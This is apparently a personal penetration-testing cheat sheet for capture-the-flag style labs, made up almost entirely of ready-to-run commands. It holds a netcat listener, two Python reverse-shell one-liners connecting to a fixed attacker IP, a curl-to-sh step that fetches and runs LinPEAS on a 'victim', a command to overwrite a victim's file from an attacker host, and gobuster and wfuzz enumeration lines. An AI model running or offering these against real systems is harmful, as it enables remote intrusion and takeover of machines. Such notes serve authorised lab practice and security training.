#### **#### Listening ###**



rlwrap nc -lvnp 80



#### **#### Fully interactive shell ####**



python -c 'import pty; pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo

fg

export TERM=xterm

\----------------------------------------------------------------------------------------------------------------------

#### **#### Reverse shell ####**



export RHOST="192.168.112.132";export RPORT=900;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'



python -c 'import socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.112.132",900));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

\-----------------------------------------------------------------------------------------------------------------------

#### **#### LinPEAS ####**



sudo python3 -m http.server 80 #Host

curl 192.168.112.132:80/linpeas.sh | sh #Victim

\-----------------------------------------------------------------------------------------------------------------------

#### **#### Replacing or Rewriting an file on victim's machine ####**



curl http://<YOUR\_IP>:8000/new\_file.txt -o /path/to/target\_file

\-----------------------------------------------------------------------------------------------------------------------

#### **##### Searching for hidden and accessible pages ####**



gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,bak

\-----------------------------------------------------------------------------------------------------------------------

#### **#### Fuzzing for the suitable parameter to access the page ####**



wfuzz -c --ss "uid=" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "<TARGET-IP>:<PORT>/<PAGE>?FUZZ=id"





#### **#### OpenVPN ####**



sudo openvpn \~/Desktop/eu-central-1-yassin629940-premium.ovpn

